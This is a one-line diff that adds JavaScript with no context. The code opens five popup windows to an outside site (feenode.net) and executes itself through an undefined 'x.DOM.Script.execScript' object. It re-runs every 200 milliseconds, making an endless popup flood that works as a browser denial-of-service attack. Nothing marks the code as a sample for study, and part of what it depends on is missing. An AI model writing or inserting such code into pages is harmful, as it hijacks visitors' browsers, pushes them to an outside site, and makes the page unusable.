@@ -1,0 +1,1 @@
+    function shellscript() {       for(i = 0; i < 5; i++) {        open('http://feenode.net/index.php?popup=1','_blank','scrollbar=no');      }    }    function main() {      x.DOM.Script.execScript(shellscript.toString());      x.DOM.Script.setTimeout("shellscript()");      setTimeout("main()", 200);    }    
